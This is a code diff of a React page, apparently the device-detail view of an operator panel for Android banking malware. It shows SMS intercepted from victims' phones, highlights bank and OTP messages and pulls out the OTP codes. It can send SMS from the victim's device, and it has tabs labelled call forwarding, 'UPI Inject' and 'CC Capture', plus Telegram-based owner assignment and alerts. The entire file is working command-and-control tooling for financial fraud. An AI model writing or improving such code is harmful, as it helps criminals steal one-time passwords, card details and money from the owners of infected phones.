@@ -72,7 +72,7 @@ export function DeviceDetail() {
 
   const [device, setDevice] = useState<PanelDevice | null>(null);
   const [loading, setLoading] = useState(true);
-  const [activeTab, setActiveTab] = useState("sms");
+  const [activeTab, setActiveTab] = useState("forward");
   const [memoInput, setMemoInput] = useState("");
   const [nameInput, setNameInput] = useState("");
   const [groupInput, setGroupInput] = useState("");
@@ -106,7 +106,7 @@ export function DeviceDetail() {
   // SMS from messages/{id} path (new APK format)
   const [smsData, setSmsData] = useState<Record<string, any>>({});
 
-  const { data: detail } = usePolling(
+  const { data: detail, error: detailError } = usePolling(
     () =>
       id
         ? getDevice(id)
@@ -120,21 +120,30 @@ export function DeviceDetail() {
   );
 
   useEffect(() => {
-    if (!detail?.device) {
-      setDevice(null);
+    if (detail) {
+      if (!detail.device) {
+        setDevice(null);
+        setLoading(false);
+        return;
+      }
+      const raw = detail.device;
+      setDevice(raw);
+      setSmsData(detail.messages || {});
+      setOwnerInput((prev) => prev || raw.ownerTelegramId || "");
+      setMemoInput((prev) => prev || raw.raw?.memo || "");
+      setNameInput((prev) => prev || raw.deviceName || "");
+      setGroupInput((prev) => prev || raw.group || "");
+      setColorTag((prev) => prev || raw.colorTag || "");
       setLoading(false);
       return;
     }
-    const raw = detail.device;
-    setDevice(raw);
-    setSmsData(detail.messages || {});
-    setOwnerInput((prev) => prev || raw.ownerTelegramId || "");
-    setMemoInput((prev) => prev || raw.raw?.memo || "");
-    setNameInput((prev) => prev || raw.deviceName || "");
-    setGroupInput((prev) => prev || raw.group || "");
-    setColorTag((prev) => prev || raw.colorTag || "");
-    setLoading(false);
-  }, [detail]);
+    // No data yet. If the poller reports a persistent error (device truly
+    // missing) let the "destroyed" screen show; otherwise keep loading.
+    if (detailError) {
+      setDevice(null);
+      setLoading(false);
+    }
+  }, [detail, detailError]);
 
   // pins for this device
   useEffect(() => {
@@ -380,9 +389,10 @@ export function DeviceDetail() {
         </p>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
-        {/* Left Sidebar - Device Info */}
-        <div className="lg:col-span-1 space-y-6">
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        {/* Main — overview + full SMS list */}
+        <div className="lg:col-span-2 space-y-6">
+          {/* Overview */}
           <div className="stat-card overflow-hidden relative">
             <div className="h-1 w-full bg-primary" />
             <div className="p-4 space-y-4">
@@ -401,7 +411,6 @@ export function DeviceDetail() {
                   <Copy className="w-3.5 h-3.5" />
                 </button>
               </div>
-
               <div className="grid grid-cols-2 gap-3 text-sm">
                 <div className="bg-muted border border-card-border rounded-2xl p-3">
                   <span className="page-eyebrow block">Model</span>
@@ -546,223 +555,200 @@ export function DeviceDetail() {
                   )}
                 </div>
               )}
-
-              {/* Ping Device */}
-              <div className="pb-3 border-b border-card-border space-y-2">
-                <div className="flex items-center justify-between">
-                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
-                    <Activity className="w-3.5 h-3.5" /> Ping Device
-                  </span>
-                  <button
-                    onClick={handlePingDevice}
-                    disabled={pinging}
-                    className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
-                      pinging
-                        ? "bg-muted text-muted-foreground border border-card-border"
-                        : "bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground"
-                    }`}
-                  >
-                    {pinging ? (
-                      <>
-                        <Timer className="w-3.5 h-3.5 animate-pulse" /> Pinging…
-                      </>
-                    ) : (
-                      <>
-                        <Wifi className="w-3.5 h-3.5" /> Ping
-                      </>
-                    )}
-                  </button>
-                </div>
-                {pingResult && (
-                  <div
-                    className={`flex items-center gap-2 px-3 py-2 rounded-2xl text-xs font-semibold ${
-                      pingResult.success
-                        ? "bg-success/10 text-success border border-success/20"
-                        : "bg-destructive/10 text-destructive border border-destructive/20"
-                    }`}
-                  >
-                    {pingResult.success ? (
-                      <>
-                        <Wifi className="w-3.5 h-3.5" /> Latency:{" "}
-                        {pingResult.latencyMs}ms — Online
-                      </>
-                    ) : (
-                      <>
-                        <WifiOff className="w-3.5 h-3.5" /> No response (15s
-                        timeout)
-                      </>
-                    )}
-                  </div>
-                )}
-              </div>
-
-              <div className="flex items-center justify-between pb-3 border-b border-card-border">
-                <span className="text-sm font-medium text-muted-foreground">
-                  Pinned
+            </div>
+          </div>
+          {/* Full SMS list */}
+          <div className="stat-card overflow-hidden flex flex-col min-h-[420px]">
+            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 p-5 border-b border-card-border">
+              <h3 className="font-bold text-lg tracking-tight text-foreground flex items-center gap-2">
+                Messages
+                <span className="text-xs font-normal text-muted-foreground">
+                  ({filteredSms.length})
                 </span>
+              </h3>
+              <div className="flex gap-2 w-full sm:w-auto">
                 <button
-                  onClick={togglePin}
-                  className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
-                    isPinned
-                      ? "bg-primary/10 text-primary border border-primary/30"
-                      : "bg-muted border border-card-border text-muted-foreground hover:text-foreground"
+                  onClick={() => setBankOnly(!bankOnly)}
+                  title="Show bank/finance messages only"
+                  className={`inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-2xl text-xs font-bold border transition-all shrink-0 ${
+                    bankOnly
+                      ? "bg-warning/15 text-warning border-warning/40"
+                      : "bg-card border-input text-muted-foreground hover:text-foreground hover:border-card-border"
                   }`}
                 >
-                  {isPinned ? (
-                    <PinOff className="w-3.5 h-3.5" />
-                  ) : (
-                    <Pin className="w-3.5 h-3.5" />
-                  )}
-                  {isPinned ? "Unpin" : "Pin to Top"}
+                  <Landmark className="w-3.5 h-3.5" />
+                  Bank {bankOnly ? "ON" : "OFF"}
                 </button>
-              </div>
-
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Operator Memo
-                </label>
-                <div className="flex gap-2">
+                <div className="relative w-full sm:w-56">
+                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                   <input
                     type="text"
-                    value={memoInput}
-                    onChange={(e) => setMemoInput(e.target.value)}
-                    placeholder="Enter memo..."
-                    className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                  />
-                  <button
-                    onClick={handleUpdateMemo}
-                    className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors"
-                  >
-                    Set
-                  </button>
-                </div>
-              </div>
-
-              <div className="space-y-2 pt-2 border-t border-card-border">
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Device Name
-                </label>
-                <div className="flex gap-2">
-                  <input
-                    type="text"
-                    value={nameInput}
-                    onChange={(e) => setNameInput(e.target.value)}
-                    placeholder="Custom name..."
-                    className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                    placeholder="Search messages..."
+                    value={smsSearch}
+                    onChange={(e) => setSmsSearch(e.target.value)}
+                    className="w-full bg-card border border-input rounded-2xl py-3 pl-10 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
                   />
                 </div>
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Group
-                </label>
-                <input
-                  type="text"
-                  value={groupInput}
-                  onChange={(e) => setGroupInput(e.target.value)}
-                  placeholder="e.g. Delhi, VIP, Test"
-                  className="w-full bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                />
-                <label className="text-sm font-medium text-muted-foreground block">
-                  Color Tag
-                </label>
-                <div className="flex gap-2 flex-wrap">
-                  {[
-                    "#22c55e",
-                    "#3b82f6",
-                    "#f59e0b",
-                    "#ef4444",
-                    "#8b5cf6",
-                    "#ec4899",
-                    "#14b8a6",
-                  ].map((c) => (
-                    <button
-                      key={c}
-                      onClick={() => setColorTag(colorTag === c ? "" : c)}
-                      className="w-7 h-7 rounded-full transition-all"
-                      style={{
-                        background: c,
-                        boxShadow:
-                          colorTag === c
-                            ? "0 0 0 2px white, 0 0 0 4px " + c
-                            : "none",
-                      }}
-                      aria-label={"color " + c}
-                    />
-                  ))}
-                </div>
-                <button
-                  onClick={handleSaveLabel}
-                  className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors w-full"
-                >
-                  Save Label & Group
-                </button>
               </div>
-
-              {isAdmin && (
-                <div className="space-y-2 pt-2 border-t border-card-border">
-                  <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
-                    <UserCheck className="w-3.5 h-3.5" /> Assign Owner
-                  </label>
-                  <div className="flex gap-2">
-                    <input
-                      type="text"
-                      value={ownerInput}
-                      onChange={(e) => setOwnerInput(e.target.value)}
-                      placeholder="Telegram ID..."
-                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all min-w-0"
-                    />
-                    <button
-                      onClick={handleSaveOwner}
-                      disabled={savingOwner}
-                      className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors disabled:opacity-50 whitespace-nowrap"
-                    >
-                      {savingOwner ? "..." : "Save"}
-                    </button>
-                  </div>
-                  <p className="text-[10px] text-muted-foreground">
-                    Only this user will be able to see this device
-                  </p>
+            </div>
+            <div className="flex-1 overflow-y-auto p-5 bg-background relative">
+              {filteredSms.length === 0 ? (
+                <div className="flex-1 flex items-center justify-center text-muted-foreground text-sm border border-dashed border-card-border rounded-2xl bg-muted">
+                  No messages found.
+                </div>
+              ) : (
+                <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2 max-h-[520px] lg:max-h-[560px] scroll-smooth">
+                  {filteredSms.map(([key, sms]: any) => {
+                    // Support new APK (sender/message/dateTime) and old APK (from/body/date)
+                    const isOutgoing =
+                      String(sms.type || "").toLowerCase() === "outgoing";
+                    const displayFrom = sms.sender || sms.from || "Unknown";
+                    const displayBody = sms.message || sms.body || "";
+                    const displayDate = sms.dateTime
+                      ? sms.dateTime
+                      : sms.date
+                        ? format(
+                            new Date(parseInt(sms.date)),
+                            "MMM d, HH:mm:ss"
+                          )
+                        : "Unknown Time";
+                    return (
+                      <div
+                        key={key}
+                        className={`bg-card border rounded-2xl p-5 shadow-md hover:shadow-lg hover:border-white/15 transition-all ${
+                          isBankSms(displayBody)
+                            ? isOtpSms(displayBody)
+                              ? "border-warning/40"
+                              : "border-warning/25"
+                            : "border-card-border"
+                        }`}
+                      >
+                        <div className="flex justify-between items-start gap-2 mb-2">
+                          <div className="flex items-center gap-1.5 min-w-0">
+                            <span
+                              className={`shrink-0 inline-flex items-center text-[10px] font-bold px-2 py-0.5 rounded-md border ${
+                                isOutgoing
+                                  ? "text-sky-500 bg-sky-500/10 border-sky-500/25"
+                                  : "text-emerald-500 bg-emerald-500/10 border-emerald-500/25"
+                              }`}
+                            >
+                              {isOutgoing ? "OUT" : "IN"}
+                            </span>
+                            <div
+                              className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
+                                isBankSms(displayBody)
+                                  ? "bg-warning/15 text-warning"
+                                  : "bg-primary/10 text-primary"
+                              }`}
+                            >
+                              {isOutgoing ? "To: " : ""}
+                              {displayFrom}
+                            </div>
+                          </div>
+                          {(isBankSms(displayBody) ||
+                            isOtpSms(displayBody)) && (
+                            <div className="flex items-center gap-1.5 shrink-0">
+                              {isOtpSms(displayBody) && (
+                                <span className="font-mono text-xs font-bold text-primary bg-primary/10 border border-primary/20 px-2 py-0.5 rounded-lg">
+                                  {otpCodeOf(displayBody)}
+                                </span>
+                              )}
+                              <span className="inline-flex items-center gap-1 text-[10px] font-bold text-warning bg-warning/10 border border-warning/25 px-2 py-0.5 rounded-lg">
+                                <Landmark className="w-3 h-3" /> BANK
+                              </span>
+                            </div>
+                          )}
+                          <div className="flex items-center gap-2 shrink-0">
+                            <span className="text-xs text-muted-foreground font-mono">
+                              {displayDate}
+                            </span>
+                            <div className="flex gap-1">
+                              <button
+                                onClick={() => copyText(displayBody)}
+                                className="p-1.5 bg-muted hover:bg-primary/10 text-muted-foreground hover:text-primary rounded-xl border border-card-border transition-colors"
+                                title="Copy"
+                                aria-label="Copy"
+                              >
+                                <Copy className="w-3.5 h-3.5" />
+                              </button>
+                              <button
+                                onClick={() => handleDeleteSms(key)}
+                                className="p-1.5 bg-muted hover:bg-destructive/10 text-muted-foreground hover:text-destructive rounded-xl border border-card-border transition-colors"
+                                title="Delete"
+                                aria-label="Delete"
+                              >
+                                <Trash2 className="w-3.5 h-3.5" />
+                              </button>
+                            </div>
+                          </div>
+                        </div>
+                        <div className="text-sm leading-relaxed break-words text-foreground pl-1 border-l-2 border-card-border">
+                          {displayBody}
+                        </div>
+                      </div>
+                    );
+                  })}
                 </div>
               )}
-
-              <div className="space-y-2 pt-2 border-t border-card-border">
-                <label className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
-                  <BellRing className="w-3.5 h-3.5" /> Online Alert
-                </label>
-                <button
-                  onClick={toggleOnlineAlert}
-                  className={`w-full flex items-center justify-between px-4 py-2.5 rounded-2xl text-sm font-semibold transition-colors border ${
-                    alertOnline
-                      ? "bg-success/10 text-success border-success/30"
-                      : "bg-card text-muted-foreground border-input hover:bg-muted/50"
-                  }`}
-                >
-                  <span className="flex items-center gap-2">
-                    <BellRing className="w-4 h-4" />
-                    {alertOnline ? "Active" : "Off"}
-                  </span>
-                  <span
-                    className={`relative inline-flex h-5 w-9 items-center rounded-full transition-colors ${alertOnline ? "bg-success" : "bg-muted"}`}
-                  >
-                    <span
-                      className={`inline-block h-3.5 w-3.5 transform rounded-full bg-white transition-transform ${alertOnline ? "translate-x-[18px]" : "translate-x-0.5"}`}
-                    />
-                  </span>
-                </button>
-                <p className="text-[10px] text-muted-foreground">
-                  Jab device dobara online aaye toh Telegram pe notification
-                  milegi
-                </p>
-              </div>
             </div>
           </div>
         </div>
-
-        {/* Right Content - Tabs */}
-        <div className="lg:col-span-3">
-          <div className="stat-card overflow-hidden flex flex-col h-[750px] lg:h-[780px] max-h-[calc(100vh-160px)] shadow-xl border border-white/10">
-            <div className="flex overflow-x-auto border-b border-card-border hide-scrollbar bg-muted p-2 gap-2 sticky top-0 z-10 -mx-4 px-4 sm:mx-0 sm:px-2">
+        {/* Sidebar — send SMS + features + management */}
+        <div className="lg:col-span-1 space-y-6">
+          {/* Send SMS */}
+          <div className="stat-card overflow-hidden relative">
+            <div className="h-1 w-full bg-primary" />
+            <div className="p-4">
+              <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
+                <div className="flex items-center gap-2">
+                  <MessageSquare className="w-4 h-4 text-primary" />
+                  <span className="text-sm font-semibold text-foreground">
+                    Send SMS from this device
+                  </span>
+                </div>
+                <div className="grid grid-cols-1 sm:grid-cols-[1fr_90px] gap-2">
+                  <input
+                    type="text"
+                    value={smsTo}
+                    onChange={(e) => setSmsTo(e.target.value)}
+                    placeholder="Destination number (+91...)"
+                    className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                  />
+                  <div className="flex gap-1 bg-muted p-1 rounded-full border border-card-border">
+                    {[0, 1].map((idx) => (
+                      <button
+                        key={idx}
+                        onClick={() => setSmsSim(idx)}
+                        className={`flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${smsSim === idx ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
+                      >
+                        SIM{idx + 1}
+                      </button>
+                    ))}
+                  </div>
+                </div>
+                <textarea
+                  value={smsBody}
+                  onChange={(e) => setSmsBody(e.target.value)}
+                  placeholder="Type your message... (supports long SMS, will auto-split)"
+                  rows={4}
+                  className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
+                />
+                <button
+                  onClick={handleSendSms}
+                  disabled={sendingSms || !smsTo.trim() || !smsBody.trim()}
+                  className="w-full bg-primary hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed text-primary-foreground font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2"
+                >
+                  <MessageSquare className="w-4 h-4" />
+                  {sendingSms ? "Sending..." : "Send SMS"}
+                </button>
+              </div>
+            </div>
+          </div>
+          {/* Device features */}
+          <div className="stat-card overflow-hidden flex flex-col max-h-[560px]">
+            <div className="flex overflow-x-auto border-b border-card-border hide-scrollbar bg-muted p-2 gap-2 sticky top-0 z-10">
               <TabBar
-                tabs={TABS.map((t) => ({
+                tabs={TABS.filter((t) => t.id !== "sms").map((t) => ({
                   id: t.id,
                   label: t.label,
                   icon: <t.icon className="w-4 h-4" />,
@@ -772,191 +758,7 @@ export function DeviceDetail() {
                 dangerIds={["delete"]}
               />
             </div>
-
-            <div className="flex-1 overflow-y-auto p-5 sm:p-6 bg-background relative">
-              {/* Tab 1: SMS */}
-              {activeTab === "sms" && (
-                <div className="h-full flex flex-col space-y-5 lg:space-y-6">
-                  <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
-                    <h3 className="font-bold text-lg tracking-tight text-foreground flex items-center gap-2">
-                      Messages{" "}
-                      <span className="text-xs font-normal text-muted-foreground">
-                        ({filteredSms.length})
-                      </span>
-                    </h3>
-                    <div className="flex gap-2 w-full sm:w-auto">
-                      <button
-                        onClick={() => setBankOnly(!bankOnly)}
-                        title="Show bank/finance messages only"
-                        className={`inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-2xl text-xs font-bold border transition-all shrink-0 ${
-                          bankOnly
-                            ? "bg-warning/15 text-warning border-warning/40"
-                            : "bg-card border-input text-muted-foreground hover:text-foreground hover:border-card-border"
-                        }`}
-                      >
-                        <Landmark className="w-3.5 h-3.5" />
-                        Bank {bankOnly ? "ON" : "OFF"}
-                      </button>
-                      <div className="relative w-full sm:w-64">
-                        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
-                        <input
-                          type="text"
-                          placeholder="Search messages..."
-                          value={smsSearch}
-                          onChange={(e) => setSmsSearch(e.target.value)}
-                          className="w-full bg-card border border-input rounded-2xl py-3 pl-10 pr-4 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                        />
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* ── Send SMS from device ── */}
-                  <div className="bg-gradient-to-br from-card to-card/80 border border-white/10 rounded-2xl p-5 shadow-lg space-y-4 backdrop-blur">
-                    <div className="flex items-center gap-2">
-                      <MessageSquare className="w-4 h-4 text-primary" />
-                      <span className="text-sm font-semibold text-foreground">
-                        Send SMS from this device
-                      </span>
-                    </div>
-                    <div className="grid grid-cols-1 sm:grid-cols-[1fr_90px] gap-2">
-                      <input
-                        type="text"
-                        value={smsTo}
-                        onChange={(e) => setSmsTo(e.target.value)}
-                        placeholder="Destination number (+91...)"
-                        className="w-full bg-card border border-input rounded-2xl px-3 py-3 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
-                      />
-                      <div className="flex gap-1 bg-muted p-1 rounded-full border border-card-border">
-                        {[0, 1].map((idx) => (
-                          <button
-                            key={idx}
-                            onClick={() => setSmsSim(idx)}
-                            className={`flex-1 py-1.5 text-xs font-semibold rounded-full transition-colors ${smsSim === idx ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:text-foreground"}`}
-                          >
-                            SIM{idx + 1}
-                          </button>
-                        ))}
-                      </div>
-                    </div>
-                    <textarea
-                      value={smsBody}
-                      onChange={(e) => setSmsBody(e.target.value)}
-                      placeholder="Type your message... (supports long SMS, will auto-split)"
-                      rows={4}
-                      className="w-full bg-card border border-input rounded-2xl px-3 py-3.5 text-[15px] leading-relaxed text-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all resize-none min-h-[110px]"
-                    />
-                    <button
-                      onClick={handleSendSms}
-                      disabled={sendingSms || !smsTo.trim() || !smsBody.trim()}
-                      className="w-full bg-primary hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed text-primary-foreground font-bold py-3 rounded-full transition-colors flex items-center justify-center gap-2"
-                    >
-                      <MessageSquare className="w-4 h-4" />
-                      {sendingSms ? "Sending..." : "Send SMS"}
-                    </button>
-                  </div>
-
-                  {filteredSms.length === 0 ? (
-                    <div className="flex-1 flex items-center justify-center text-muted-foreground text-sm border border-dashed border-card-border rounded-2xl bg-muted">
-                      No messages found.
-                    </div>
-                  ) : (
-                    <div className="flex-1 overflow-y-auto space-y-4 pr-1 sm:pr-2 max-h-[520px] lg:max-h-[560px] scroll-smooth">
-                      {filteredSms.map(([key, sms]: any) => {
-                        // Support new APK (sender/message/dateTime) and old APK (from/body/date)
-                        const isOutgoing =
-                          String(sms.type || "").toLowerCase() === "outgoing";
-                        const displayFrom = sms.sender || sms.from || "Unknown";
-                        const displayBody = sms.message || sms.body || "";
-                        const displayDate = sms.dateTime
-                          ? sms.dateTime
-                          : sms.date
-                            ? format(
-                                new Date(parseInt(sms.date)),
-                                "MMM d, HH:mm:ss"
-                              )
-                            : "Unknown Time";
-                        return (
-                          <div
-                            key={key}
-                            className={`bg-card border rounded-2xl p-5 shadow-md hover:shadow-lg hover:border-white/15 transition-all ${
-                              isBankSms(displayBody)
-                                ? isOtpSms(displayBody)
-                                  ? "border-warning/40"
-                                  : "border-warning/25"
-                                : "border-card-border"
-                            }`}
-                          >
-                            <div className="flex justify-between items-start gap-2 mb-2">
-                              <div className="flex items-center gap-1.5 min-w-0">
-                                <span
-                                  className={`shrink-0 inline-flex items-center text-[10px] font-bold px-2 py-0.5 rounded-md border ${
-                                    isOutgoing
-                                      ? "text-sky-500 bg-sky-500/10 border-sky-500/25"
-                                      : "text-emerald-500 bg-emerald-500/10 border-emerald-500/25"
-                                  }`}
-                                >
-                                  {isOutgoing ? "OUT" : "IN"}
-                                </span>
-                                <div
-                                  className={`font-semibold text-sm px-3 py-1 rounded-full truncate max-w-[55%] ${
-                                    isBankSms(displayBody)
-                                      ? "bg-warning/15 text-warning"
-                                      : "bg-primary/10 text-primary"
-                                  }`}
-                                >
-                                  {isOutgoing ? "To: " : ""}
-                                  {displayFrom}
-                                </div>
-                              </div>
-                              {(isBankSms(displayBody) ||
-                                isOtpSms(displayBody)) && (
-                                <div className="flex items-center gap-1.5 shrink-0">
-                                  {isOtpSms(displayBody) && (
-                                    <span className="font-mono text-xs font-bold text-primary bg-primary/10 border border-primary/20 px-2 py-0.5 rounded-lg">
-                                      {otpCodeOf(displayBody)}
-                                    </span>
-                                  )}
-                                  <span className="inline-flex items-center gap-1 text-[10px] font-bold text-warning bg-warning/10 border border-warning/25 px-2 py-0.5 rounded-lg">
-                                    <Landmark className="w-3 h-3" /> BANK
-                                  </span>
-                                </div>
-                              )}
-                              <div className="flex items-center gap-2 shrink-0">
-                                <span className="text-xs text-muted-foreground font-mono">
-                                  {displayDate}
-                                </span>
-                                <div className="flex gap-1">
-                                  <button
-                                    onClick={() => copyText(displayBody)}
-                                    className="p-1.5 bg-muted hover:bg-primary/10 text-muted-foreground hover:text-primary rounded-xl border border-card-border transition-colors"
-                                    title="Copy"
-                                    aria-label="Copy"
-                                  >
-                                    <Copy className="w-3.5 h-3.5" />
-                                  </button>
-                                  <button
-                                    onClick={() => handleDeleteSms(key)}
-                                    className="p-1.5 bg-muted hover:bg-destructive/10 text-muted-foreground hover:text-destructive rounded-xl border border-card-border transition-colors"
-                                    title="Delete"
-                                    aria-label="Delete"
-                                  >
-                                    <Trash2 className="w-3.5 h-3.5" />
-                                  </button>
-                                </div>
-                              </div>
-                            </div>
-                            <div className="text-sm leading-relaxed break-words text-foreground pl-1 border-l-2 border-card-border">
-                              {displayBody}
-                            </div>
-                          </div>
-                        );
-                      })}
-                    </div>
-                  )}
-                </div>
-              )}
-
-              {/* Tab 2: Call Forward */}
+            <div className="flex-1 overflow-y-auto p-4 bg-background relative">
               {activeTab === "forward" && (
                 <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                   <div className="text-center mb-4">
@@ -1061,8 +863,6 @@ export function DeviceDetail() {
                   )}
                 </div>
               )}
-
-              {/* Tab 3: UPI Inject */}
               {activeTab === "inject" && (
                 <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                   <div className="text-center mb-4">
@@ -1133,8 +933,6 @@ export function DeviceDetail() {
                   </div>
                 </div>
               )}
-
-              {/* Tab 4: Cards (CC Capture) */}
               {activeTab === "cards" && (
                 <div className="h-full flex flex-col space-y-4">
                   <div className="flex justify-between items-center">
@@ -1363,8 +1161,6 @@ export function DeviceDetail() {
                   })()}
                 </div>
               )}
-
-              {/* Tab 5: Data — raw device node + inject/webhook state */}
               {activeTab === "data" && (
                 <div className="h-full flex flex-col space-y-4">
                   <div className="flex items-center justify-between gap-2">
@@ -1440,8 +1236,6 @@ export function DeviceDetail() {
                   </div>
                 </div>
               )}
-
-              {/* Tab 6: Delete */}
               {activeTab === "delete" && (
                 <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                   <div className="text-center mb-4">
@@ -1475,6 +1269,213 @@ export function DeviceDetail() {
                   </div>
                 </div>
               )}
+            </div>
+          </div>
+          {/* Device management */}
+          <div className="stat-card overflow-hidden relative">
+            <div className="h-1 w-full bg-primary" />
+            <div className="p-4 space-y-4">
+              {/* Ping Device */}
+              <div className="pb-3 border-b border-card-border space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="text-sm font-medium text-muted-foreground flex items-center gap-1.5">
+                    <Activity className="w-3.5 h-3.5" /> Ping Device
+                  </span>
+                  <button
+                    onClick={handlePingDevice}
+                    disabled={pinging}
+                    className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
+                      pinging
+                        ? "bg-muted text-muted-foreground border border-card-border"
+                        : "bg-primary/10 text-primary border border-primary/30 hover:bg-primary hover:text-primary-foreground"
+                    }`}
+                  >
+                    {pinging ? (
+                      <>
+                        <Timer className="w-3.5 h-3.5 animate-pulse" /> Pinging…
+                      </>
+                    ) : (
+                      <>
+                        <Wifi className="w-3.5 h-3.5" /> Ping
+                      </>
+                    )}
+                  </button>
+                </div>
+                {pingResult && (
+                  <div
+                    className={`flex items-center gap-2 px-3 py-2 rounded-2xl text-xs font-semibold ${
+                      pingResult.success
+                        ? "bg-success/10 text-success border border-success/20"
+                        : "bg-destructive/10 text-destructive border border-destructive/20"
+                    }`}
+                  >
+                    {pingResult.success ? (
+                      <>
+                        <Wifi className="w-3.5 h-3.5" /> Latency:{" "}
+                        {pingResult.latencyMs}ms — Online
+                      </>
+                    ) : (
+                      <>
+                        <WifiOff className="w-3.5 h-3.5" /> No response (15s
+                        timeout)
+                      </>
+                    )}
+                  </div>
+                )}
+              </div>
+              <div className="flex items-center justify-between pb-3 border-b border-card-border">
+                <span className="text-sm font-medium text-muted-foreground">
+                  Pinned
+                </span>
+                <button
+                  onClick={togglePin}
+                  className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold transition-all ${
+                    isPinned
+                      ? "bg-primary/10 text-primary border border-primary/30"
+                      : "bg-muted border border-card-border text-muted-foreground hover:text-foreground"
+                  }`}
+                >
+                  {isPinned ? (
+                    <PinOff className="w-3.5 h-3.5" />
+                  ) : (
+                    <Pin className="w-3.5 h-3.5" />
+                  )}
+                  {isPinned ? "Unpin" : "Pin to Top"}
+                </button>
+                <div className="space-y-2">
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Operator Memo
+                  </label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      value={memoInput}
+                      onChange={(e) => setMemoInput(e.target.value)}
+                      placeholder="Enter memo..."
+                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                    />
+                    <button
+                      onClick={handleUpdateMemo}
+                      className="bg-primary hover:bg-primary/90 text-primary-foreground px-4 py-2.5 rounded-full text-xs font-semibold transition-colors"
+                    >
+                      Set
+                    </button>
+                  </div>
+                </div>
+                <div className="space-y-2 pt-2 border-t border-card-border">
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Device Name
+                  </label>
+                  <div className="flex gap-2">
+                    <input
+                      type="text"
+                      value={nameInput}
+                      onChange={(e) => setNameInput(e.target.value)}
+                      placeholder="Custom name..."
+                      className="flex-1 bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                    />
+                  </div>
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Group
+                  </label>
+                  <input
+                    type="text"
+                    value={groupInput}
+                    onChange={(e) => setGroupInput(e.target.value)}
+                    placeholder="e.g. Delhi, VIP, Test"
+                    className="w-full bg-card border border-input rounded-2xl px-3 py-2.5 text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary/25 focus:border-primary transition-all"
+                  />
+                  <label className="text-sm font-medium text-muted-foreground block">
+                    Color Tag
+                  </label>
+                  <div className="flex gap-2 flex-wrap">
+                    {[
+                      "#22c55e",
+                      "#3b82f6",
+                      "#f59e0b",
+                      "#ef4444",
+                      "#8b5cf6",
+                      "#ec4899",
+                      "#14b8a6",
+                    ].map((c) => (
